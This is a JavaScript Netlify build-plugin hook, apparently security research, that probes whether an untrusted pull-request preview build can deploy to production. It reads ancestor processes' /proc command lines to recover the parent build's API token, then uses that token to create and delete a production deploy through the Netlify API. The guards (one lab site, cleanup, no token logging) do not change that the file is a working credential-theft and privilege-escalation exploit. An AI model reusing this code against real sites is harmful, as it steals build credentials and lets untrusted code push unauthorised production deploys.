import { createHash } from 'node:crypto'
import { readFile } from 'node:fs/promises'

const SITE_ID = '43a2f4e4-df31-455e-85bc-21f37fae92cd'
const API_ORIGIN = 'https://api.netlify.com'
const REPOSITORY = 'Jhounx/netlify-untrusted-preview-lab'
const BRANCH = 'bot/untrusted-preview-probe-36495196637'
const REVIEW_ID = '1'
const MISSING_PATH = '__nf_missing_untrusted_production_authority_20261001.txt'
const MISSING_BYTES = Buffer.from('netlify-untrusted-production-authority-missing-v1\n')
const MISSING_SHA1 = createHash('sha1').update(MISSING_BYTES).digest('hex')

const safeError = (error) => ({
  name: error?.constructor?.name || 'Error',
  message: String(error?.message || error).slice(0, 160),
})

const procText = async (pid, name) => {
  try {
    return await readFile(`/proc/${pid}/${name}`, 'utf8')
  } catch {
    return ''
  }
}

const parentPid = async (pid) => {
  const match = (await procText(pid, 'status')).match(/^PPid:\s+(\d+)$/m)
  return match ? Number(match[1]) : 0
}

const optionValue = (argv, option) => {
  for (let index = 0; index < argv.length; index += 1) {
    if (argv[index] === option && index + 1 < argv.length) return argv[index + 1]
    if (argv[index].startsWith(`${option}=`)) return argv[index].slice(option.length + 1)
  }
  return null
}

const recoverAncestorToken = async () => {
  let pid = process.pid
  for (let depth = 0; depth < 16; depth += 1) {
    const argv = (await procText(pid, 'cmdline')).split('\0').filter(Boolean)
    const token = optionValue(argv, '--token')
    if (token) {
      return {
        token,
        ancestorIsNetlifyBuild: argv.some((item) => /(?:@netlify\/build|netlify-build)/i.test(item)),
      }
    }
    const nextPid = await parentPid(pid)
    if (!Number.isInteger(nextPid) || nextPid <= 0 || nextPid === pid) break
    pid = nextPid
  }
  return { token: null, ancestorIsNetlifyBuild: false }
}

const apiUrl = (path) => new URL(`/api/v1${path}`, API_ORIGIN)

const request = async (method, url, { token, body } = {}) => {
  const headers = {}
  if (token) headers.authorization = `Bearer ${token}`
  if (body !== undefined) headers['content-type'] = 'application/json'
  const response = await fetch(url, {
    method,
    headers,
    body: body === undefined ? undefined : JSON.stringify(body),
    redirect: 'error',
    signal: AbortSignal.timeout(15_000),
  })
  let value = null
  if (response.ok && response.headers.get('content-type')?.includes('json')) {
    value = await response.json()
  } else {
    await response.body?.cancel()
  }
  return { status: response.status, ok: response.ok, value }
}

const readGitHubPr = async (commitRef) => {
  const response = await fetch(`https://api.github.com/repos/${REPOSITORY}/pulls/${REVIEW_ID}`, {
    headers: { accept: 'application/vnd.github+json', 'user-agent': 'netlify-controlled-security-probe' },
    redirect: 'error',
    signal: AbortSignal.timeout(10_000),
  })
  const body = response.ok ? await response.json() : null
  if (!response.ok) await response.body?.cancel()
  return {
    status: response.status,
    identityMatches:
      body?.state === 'open' &&
      body?.user?.login === 'github-actions[bot]' &&
      body?.user?.type === 'Bot' &&
      body?.author_association === 'NONE' &&
      body?.head?.ref === BRANCH &&
      body?.head?.sha === commitRef &&
      body?.head?.repo?.full_name === REPOSITORY &&
      body?.base?.ref === 'main',
    responseBodyRetained: false,
  }
}

const createBody = {
  draft: false,
  branch: 'main',
  title: 'controlled untrusted production authority probe',
  files: { [MISSING_PATH]: MISSING_SHA1 },
}

export const onPreBuild = async ({ constants, utils }) => {
  const deployId = process.env.DEPLOY_ID || ''
  const commitRef = process.env.COMMIT_REF || ''
  const result = {
    schema: 'netlify-untrusted-production-deploy-authority.v1',
    prerequisites: {},
    attempted: false,
    unauthenticatedCreateStatus: null,
    recoveredTokenCreateStatus: null,
    acceptedDeploy: null,
    productionPointerUnchanged: null,
    cleanupStatus: null,
    cleanupRequired: false,
    rawCredentialLogged: false,
    responseBodyRetained: false,
    missingArtifactUploaded: false,
    syntheticOnly: true,
  }

  let createdDeployId = null
  let recoveredToken = null
  try {
    const { token, ancestorIsNetlifyBuild } = await recoverAncestorToken()
    recoveredToken = token
    const github = /^[0-9a-f]{40}$/.test(commitRef)
      ? await readGitHubPr(commitRef)
      : { status: null, identityMatches: false, responseBodyRetained: false }
    const site = token ? await request('GET', apiUrl(`/sites/${SITE_ID}`), { token }) : null
    const deploy = token && /^[0-9a-f]{24}$/.test(deployId)
      ? await request('GET', apiUrl(`/deploys/${deployId}`), { token })
      : null
    const productionBefore = site?.value?.published_deploy?.id || null

    result.prerequisites = {
      hostedBuild: process.env.NETLIFY === 'true' && constants.IS_LOCAL === false,
      deployPreview: process.env.CONTEXT === 'deploy-preview',
      exactSite: process.env.SITE_ID === SITE_ID && constants.SITE_ID === SITE_ID,
      exactBranch: process.env.BRANCH === BRANCH,
      exactReview: process.env.REVIEW_ID === REVIEW_ID,
      commitRefPresent: /^[0-9a-f]{40}$/.test(commitRef),
      childEnvironmentTokenAbsent: !process.env.NETLIFY_API_TOKEN,
      tokenRecoveredFromAncestor: typeof token === 'string' && token.length > 0,
      tokenAncestorIsNetlifyBuild: ancestorIsNetlifyBuild,
      githubPrUntrusted: github.status === 200 && github.identityMatches,
      siteReadBound:
        site?.status === 200 &&
        site?.value?.id === SITE_ID &&
        site?.value?.build_settings?.repo_path === REPOSITORY &&
        site?.value?.build_settings?.untrusted_flow === 'redact' &&
        site?.value?.build_settings?.public_repo === true &&
        /^[0-9a-f]{24}$/.test(productionBefore || ''),
      deployReadBound:
        deploy?.status === 200 &&
        deploy?.value?.id === deployId &&
        deploy?.value?.site_id === SITE_ID &&
        deploy?.value?.context === 'deploy-preview' &&
        deploy?.value?.branch === BRANCH &&
        String(deploy?.value?.review_id) === REVIEW_ID &&
        deploy?.value?.commit_ref === commitRef,
    }

    if (!Object.values(result.prerequisites).every(Boolean)) {
      throw new Error('Controlled untrusted-build prerequisites were not satisfied')
    }

    result.attempted = true
    const unauthenticated = await request('POST', apiUrl(`/sites/${SITE_ID}/deploys`), { body: createBody })
    result.unauthenticatedCreateStatus = unauthenticated.status
    if (![401, 403].includes(unauthenticated.status)) {
      throw new Error('Unauthenticated production-deploy control did not fail closed')
    }

    const created = await request('POST', apiUrl(`/sites/${SITE_ID}/deploys`), { token, body: createBody })
    result.recoveredTokenCreateStatus = created.status
    if (created.ok && created.value && /^[0-9a-f]{24}$/.test(created.value.id || '')) {
      createdDeployId = created.value.id
      const required = Array.isArray(created.value.required) ? created.value.required : []
      result.acceptedDeploy = {
        id: createdDeployId,
        siteBound: created.value.site_id === SITE_ID,
        context: created.value.context || null,
        branch: created.value.branch || null,
        state: created.value.state || null,
        published: Boolean(created.value.published_at),
        exactMissingArtifactRequired:
          required.length === 1 && required[0] === MISSING_SHA1,
      }
      result.cleanupRequired = true
    }

    const siteAfter = await request('GET', apiUrl(`/sites/${SITE_ID}`), { token })
    result.productionPointerUnchanged =
      siteAfter.status === 200 && siteAfter.value?.published_deploy?.id === productionBefore

    if (createdDeployId) {
      const deleted = await request('DELETE', apiUrl(`/deploys/${createdDeployId}`), { token })
      result.cleanupStatus = deleted.status
      result.cleanupRequired = deleted.status !== 204
    }

  } catch (error) {
    result.error = safeError(error)
    result.cleanupRequired = result.cleanupRequired || Boolean(createdDeployId)
    if (createdDeployId && recoveredToken) {
      try {
        const deleted = await request('DELETE', apiUrl(`/deploys/${createdDeployId}`), {
          token: recoveredToken,
        })
        result.cleanupStatus = deleted.status
        result.cleanupRequired = deleted.status !== 204
      } catch {}
    }
  }
  console.log(`NETLIFY_UNTRUSTED_PRODUCTION_AUTHORITY ${JSON.stringify(result)}`)
  utils.build.failBuild(
    result.error
      ? 'Controlled production-deploy authority probe failed safely'
      : 'Controlled production-deploy authority probe completed',
  )
}
